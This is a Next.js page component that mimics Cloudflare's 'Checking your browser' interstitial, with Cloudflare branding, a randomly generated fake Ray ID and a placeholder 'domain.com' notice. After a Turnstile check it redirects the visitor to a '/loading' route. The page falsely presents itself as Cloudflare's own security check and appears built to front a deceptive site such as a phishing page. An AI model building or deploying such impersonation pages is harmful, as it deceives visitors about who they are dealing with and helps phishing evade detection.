'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'

export default function Home() {
  const [isVerifying, setIsVerifying] = useState(false)
  const [turnstileLoaded, setTurnstileLoaded] = useState(false)
  const [rayId, setRayId] = useState('')
  const router = useRouter()

  useEffect(() => {
    const generateRayId = () => {
      const chars = '0123456789abcdef'
      let result = ''
      for (let i = 0; i < 16; i++) {
        result += chars[Math.floor(Math.random() * chars.length)]
      }
      return result
    }
    setRayId(generateRayId())

    const script = document.createElement('script')
    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js'
    script.async = true
    script.onload = () => {
      setTurnstileLoaded(true)
      window.handleTurnstileSuccess = handleTurnstileSuccess
    }
    document.head.appendChild(script)

    return () => {
      if (document.head.contains(script)) {
        document.head.removeChild(script)
      }
    }
  }, [])

  const handleTurnstileSuccess = async (token) => {
    setIsVerifying(true)
    
    try {
      const response = await fetch('/api/turnstile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
      })

      if (response.ok) {
        router.push('/loading')
      } else {
        alert('Verification failed. Please try again.')
        setIsVerifying(false)
        if (window.turnstile) {
          window.turnstile.reset()
        }
      }
    } catch (error) {
      console.error('Turnstile error:', error)
      alert('Network error. Please try again.')
      setIsVerifying(false)
      if (window.turnstile) {
        window.turnstile.reset()
      }
    }
  }

  return (
    <div className="min-h-screen" style={{
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif'
    }}>
      <div className="min-h-screen flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-lg shadow-2xl overflow-hidden">
            <div className="px-8 py-6 border-b border-gray-100">
              <div className="flex items-center justify-center mb-4">
                <div className="flex items-center">
                  <div className="w-8 h-8 bg-orange-500 rounded mr-3 flex items-center justify-center">
                    <div className="w-4 h-4 bg-white rounded-full"></div>
                  </div>
                  <span className="text-xl font-semibold text-gray-800">Cloudflare</span>
                </div>
              </div>
              
              <div className="text-center">
                <h1 className="text-2xl font-bold text-gray-900 mb-3">Checking your browser</h1>
                <p className="text-gray-600 text-sm leading-relaxed">
                  This process is automatic. Your browser will redirect to your requested content shortly.
                </p>
              </div>
            </div>

            <div className="px-8 py-6">
              <div className="bg-gray-50 border border-gray-200 rounded-md p-6">
                <div className="flex items-start mb-4">
                  <div className="flex-shrink-0 mt-1">
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                  </div>
                  <div className="ml-3 flex-1">
                    <p className="text-sm font-medium text-gray-900 mb-1">
                      Checking if the site connection is secure
                    </p>
                    <p className="text-xs text-gray-500">
                      domain.com needs to review the security of your connection before proceeding.
                    </p>
                  </div>
                </div>

                <div className="border-t border-gray-200 pt-4">
                  <p className="text-xs text-gray-500 mb-4">
                    Please complete the security check to access the site
                  </p>
                  
                  <div className="flex justify-center">
                    {!isVerifying ? (
                      turnstileLoaded ? (
                        <div 
                          className="cf-turnstile" 
                          data-sitekey={process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY}
                          data-callback="handleTurnstileSuccess"
                          data-theme="light"
                        ></div>
                      ) : (
                        <div className="w-72 h-16 bg-white border border-gray-300 rounded flex items-center justify-center">
                          <div className="flex items-center">
                            <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-orange-500 mr-2"></div>
                            <span className="text-sm text-gray-600">Loading verification...</span>
                          </div>
                        </div>
                      )
                    ) : (
                      <div className="w-72 h-16 bg-white border border-gray-300 rounded flex items-center justify-center">
                        <div className="flex items-center">
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-orange-500 mr-2"></div>
                          <span className="text-sm text-gray-600">Verifying...</span>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>

            <div className="px-8 py-4 bg-gray-50 border-t border-gray-100">
              <div className="text-center">
                <p className="text-xs text-gray-500 mb-1">Performance & security by Cloudflare</p>
                <p className="text-xs text-gray-400">Ray ID: {rayId}</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}